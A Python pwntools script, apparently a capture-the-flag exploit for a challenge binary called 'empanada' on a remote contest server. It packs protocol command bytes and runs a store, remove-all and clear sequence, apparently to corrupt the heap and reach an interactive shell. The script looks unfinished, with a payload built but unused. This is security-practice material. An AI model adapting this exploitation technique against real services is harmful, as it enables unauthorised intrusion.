from pwn import *

DEBUG = True

# p = process('./empanada')
p = remote('plus.or.kr', 4000)

def r(msg):
  response = p.recvuntil(msg)
  if DEBUG:
    print response
  return response

# type index size
def make_byte(t, i, s):
    print '== make byte'
    tt = (t << 7)
    print hex(tt)
    ii = (i << 5)
    print hex(ii)

    res = (tt | ii | s) & 0xff
    print hex(res)

    return res

def store(text, times, size):
    t = make_byte(1, times - 1, size)
    p.send(p8(t))

    t = ''
    t += p8( 0x10 ) # store
    t += text
    p.send( t )

    for i in xrange(times - 1):
      t = make_byte(1, 0, size)
      p.send(p8(t))

      t = ''
      t += p8( 0x10 ) # store
      t += text
      p.send( t )

def gethash(i):
    t = make_byte(1, 0, 0x1f)
    p.send(p8(t))

    t = ''
    t += p8( 0x20 ) # gethash
    t += p8 (i)
    t += 'B' * (0x1f - len(t))
    p.send( t )

def getmsg(i):
    t = make_byte(1, 0, 0x1f)
    p.send(p8(t))

    t = ''
    t += p8( 0x30 ) # getmsg
    t += chr (i)
    t += 'C' * (0x1f - len(t))
    p.send( t )

def mcount():
    t = make_byte(1, 0, 0x1f)
    p.send(p8(t))

    t = ''
    t += p8( 0x40 ) # getmsg
    t += 'D' * (0x1f - len(t))
    p.send( t )

def rm(i):
    t = make_byte(1, 0, 0x1f)
    p.send(p8(t))

    t = ''
    t += p8( 0x50 ) # rm
    t += chr( i ) 
    t += 'E' * (0x1f - len(t))
    p.send( t )

    print p.recvuntil('Return:')
 
def getall():
    t = make_byte(1, 0, 0x1f)
    p.send(p8(t))

    t = ''
    t += p8( 0x60 ) # rm
    t += 'F' * (0x1f - len(t))
    p.send( t )   
 
def rmall():
    t = make_byte(1, 0, 0x1f)
    p.send(p8(t))

    t = ''
    t += p8( 0x0 ) # rm
    t += 'G' * (0x1f - len(t))
    p.send( t )   

    
def clearinv():
    t = make_byte(1, 0, 0x1f)
    p.send(p8(t))

    t = ''
    t += p8( 0xfe ) # rm
    t += 'G' * (0x1f - len(t))
    p.send( t )   

payload = p32(1)
payload += p32(8)
payload += 'A'

for i in range(2):
    store('a' * 21, 2, 22)
    r("Return")

# getall()
rmall()

for i in xrange(3):
  store('a' * 21, 1, 22)
  r("Return")

clearinv()

p.interactive()
p.close()
